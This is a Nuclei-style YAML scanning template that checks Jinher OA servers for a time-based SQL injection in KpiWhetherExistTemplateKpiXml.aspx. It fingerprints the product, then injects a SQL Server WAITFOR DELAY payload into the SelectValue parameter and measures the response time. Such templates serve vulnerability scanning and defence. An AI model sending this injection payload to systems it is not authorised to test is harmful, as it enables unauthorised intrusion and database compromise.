id: poc-yaml-jinher-kpiwhetherexisttemplatekpixml-aspx-sqli
info:
  name: 金和OA KpiWhetherExistTemplateKpiXml.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Appraise/KpiWhetherExistTemplateKpiXml.aspx/?SelectValue=1))waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0"
      - type: dsl
        dsl:
          - "duration >= to_number(t1) && duration <= to_number(t2)"
